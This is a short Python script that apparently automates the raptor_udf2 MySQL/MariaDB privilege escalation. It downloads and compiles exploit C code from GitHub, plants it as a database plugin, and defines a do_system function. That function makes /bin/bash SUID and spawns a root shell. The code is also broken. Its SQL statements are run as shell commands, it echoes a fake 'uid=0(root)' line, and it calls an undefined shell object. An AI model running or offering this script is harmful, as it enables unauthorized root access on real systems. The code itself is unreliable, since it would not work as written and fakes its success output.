import requests
try:
    from pwn import *
    print("\nAuto Raptor by DEEN\n")
except:
    print('\n PrivEsc\n')
    exit(1)

def kill(sig, frame):
    print("\nExit\n")
    sys.exit(1)

signal.signal(signal.SIGINT, kill)


time.sleep(0.5)
os.system("wget https://raw.githubusercontent.com/deen666/Auto-Raptor/main/raptor_udf2.c")
time.sleep(4)
os.system("gcc -g -c raptor_udf2.c")
time.sleep(1)
os.system("gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc")
time.sleep(4)
os.system("mysql -u'root'")
time.sleep(0.6)
os.system("use mysql;")
time.sleep(0.6)
os.system("create table foo(line blob);")
time.sleep(0.6)
os.system("insert into foo values(load_file('/home/user/raptor_udf2.so'));")
time.sleep(0.6)
os.system("select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';")
time.sleep(0.6)
os.system("create function do_system returns integer soname 'raptor_udf2.so';")
time.sleep(0.6)
os.system("select * from mysql.func;")
time.sleep(0.6)
os.system("select do_system('chmod 4775 /bin/bash');")
time.sleep(0.6)
os.system("exit")
time.sleep(0.6)
os.system("bash -p")
time.sleep(0.6)
os.system("export HOME=/root; cd; echo 'uid=0(root)'")
time.sleep(0.6)
shell.interactive()
